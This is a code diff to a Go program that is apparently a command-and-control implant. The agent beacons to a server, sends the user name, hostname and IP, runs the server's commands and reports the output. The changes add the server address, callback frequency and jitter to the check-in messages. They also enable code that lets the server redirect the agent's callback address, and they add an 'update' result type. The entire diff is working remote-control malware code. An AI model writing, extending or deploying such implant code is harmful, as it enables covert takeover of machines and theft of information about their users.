@@ -113,7 +113,7 @@ func main() {
 		}
 		ipAddress := beacon.LocalAddr().(*net.TCPAddr)
 		ip := fmt.Sprintf("%v", ipAddress)
-		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip + ":NoKeysBeacon"
+		init := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + ip + ":NoKeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter
 		// logger.Logf(logger.Debug, "Sending : %s\n", init)
 		_, _ = beacon.Write([]byte(init + "\n"))
 		dec := gob.NewDecoder(beacon)
@@ -128,11 +128,11 @@ func main() {
 
 		logger.Logf(logger.Debug, "%s\n", instruct.UpdateAgentConfig.CallbackTo)
 		// Update agent config when possible
-		// if instruct.UpdateAgentConfig.CallbackTo != "" {
-		// 	glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
-		// 	ServerIP = glob[0]
-		// 	ServerPort = glob[1]
-		// }
+		if instruct.UpdateAgentConfig.CallbackTo != "" {
+			glob := strings.Split(instruct.UpdateAgentConfig.CallbackTo, ":")
+			ServerIP = glob[0]
+			ServerPort = glob[1]
+		}
 		if instruct.UpdateAgentConfig.CallbackFrequency != "" {
 			CallbackFrequency = instruct.UpdateAgentConfig.CallbackFrequency
 		}
@@ -158,6 +158,13 @@ func main() {
 				Uuid:        instruct.UpdateAgentConfig.Uuid,
 				Result:      "1",
 				Output:      CmdOut,
+				CommandUUID: instruct.CommandUUID,
+			}
+		} else if CommandType == "update" {
+			destruct = types.GiveServerResult{
+				Uuid:        instruct.UpdateAgentConfig.Uuid,
+				Result:      "1",
+				Output:      "Success",
 				CommandUUID: instruct.CommandUUID,
 			}
 		} else { // if CommandType == ""
@@ -188,7 +195,7 @@ func main() {
 		}
 		keyipAddress := keybeacon.LocalAddr().(*net.TCPAddr)
 		keyip := fmt.Sprintf("%v", keyipAddress)
-		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip + ":KeysBeacon"
+		keyinit := Agentuuid + ":" + strings.TrimSuffix(string(user), "\n") + ":" + strings.TrimSuffix(string(hostname), "\n") + ":" + keyip + ":KeysBeacon:" + ServerIP + ":" + ServerPort + ":" + CallbackFrequency + ":" + CallbackJitter
 		// logger.Logf(logger.Debug, "Sending : %s\n", init)
 		_, _ = keybeacon.Write([]byte(keyinit + "\n"))
 		keydec := gob.NewDecoder(keybeacon)
